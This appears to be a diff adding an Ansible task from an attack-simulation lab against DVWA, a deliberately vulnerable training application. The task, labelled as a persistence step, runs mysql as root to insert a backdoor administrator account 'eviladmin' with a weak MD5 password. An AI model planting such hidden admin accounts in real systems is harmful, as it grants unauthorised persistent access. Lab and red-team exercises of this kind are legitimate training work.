@@ -1,0 +1,4 @@
+---
+- name: Persistence - Create new admin user in DVWA database
+  shell: |
+    mysql -u root dvwa -e "INSERT INTO users (user_id, user, password, avatar, last_login, failed_login) VALUES (6, 'eviladmin', MD5('evilpass'), 'avatars/admin.jpg', NOW(), 0);"
